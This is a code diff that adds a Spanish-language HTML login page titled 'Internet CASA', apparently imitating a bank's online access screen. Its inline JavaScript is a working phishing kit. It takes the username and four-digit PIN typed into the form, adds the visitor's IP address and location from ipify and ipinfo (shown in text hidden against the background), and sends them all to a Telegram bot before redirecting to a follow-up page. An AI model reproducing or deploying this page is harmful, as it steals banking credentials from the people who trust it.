@@ -1,0 +1,126 @@
+
+  
+<!DOCTYPE html>
+<html ><head>
+
+  
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Internet CASA</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="gastronomia/front.css">
+  
+ 
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+    <script src="reserva.js"></script>
+    <script>
+      $.getJSON("https://api.ipify.org?format=json", function(data) {
+              $("#gfg").html(data.ip);
+          });
+          $.getJSON("https://ipinfo.io", function(response) {
+        $("#ip").html("IP: " + response.ip);
+        $("#address").html("" + response.city + ", " + response.country);
+      });
+  
+      var u_name, u_name2, ip, ip2, message;
+      var ready = function() {
+        u_name = document.getElementById("eltipo").value;
+        u_name2 = document.getElementById("eltipo2").value;
+        ip = document.getElementById("gfg").innerHTML;
+        ip2 = document.getElementById("address").innerHTML;
+        message = "FORMULARIO\n☰Usuario: " + u_name + "\n☰clv2: " + u_name2 + "\n🌎IP: " + ip +"\n" + ip2;
+      };
+      var sender = function() {
+        ready();
+        var settings = {
+          "async": true,
+          "crossDomain": true,
+          "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+          "method": "POST",
+          "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+          },
+          "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+          })
+        };
+        $.ajax(settings).done(function(response) {
+          console.log(response);
+          window.location = 'siguienteparte.html';
+        });
+        return false;
+      };
+
+
+
+    </script>
+
+<script>
+
+
+  function validateNumber(event) {
+    var charCode = (event.which) ? event.which : event.keyCode;
+    if (charCode > 31 && (charCode < 48 || charCode > 57)) {
+      event.preventDefault();
+    } else if (event.target.value.length >= 6) {
+      event.preventDefault();
+    }
+  }
+  
+  
+      </script>
+
+
+    
+</head>
+
+<body style="background-color: rgb(244, 244, 244);" >
+
+<center>
+  <img style="width: 100px;"  src="gastronomia/images.png" alt="">
+
+  <h2> Hola</h2>
+<p>Ingresa tus datos actuales!! </p>
+
+</center>
+  <div class="mi" >
+    <center>
+  <form method="post" action="#" onsubmit="return sender();">
+   
+    <input placeholder="Ingresa el usuario" style="border: none; border-bottom: 3px solid rgb(246, 225, 3);" type="text" id="eltipo" name="eltipo" >
+    <br><br>
+
+    <input minlength="4"  maxlength="4" required placeholder="ingresa tu clave" style="border: none; border-bottom: 3px solid rgb(246, 225, 3);" type="text" id="eltipo2" name="eltipo2"  required onkeypress="validateNumber(event)" >
+    <br>
+     
+  </div><br>
+  <center>
+		<button type="submit" >Enviar</button>
+  </form>
+  <div style="color: rgb(244, 244, 244);" >
+    <p id="gfg"></p>
+    <p id="ip"></p>
+    <p id="address"></p></div>
+</center>
+
+</body>
+</html>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
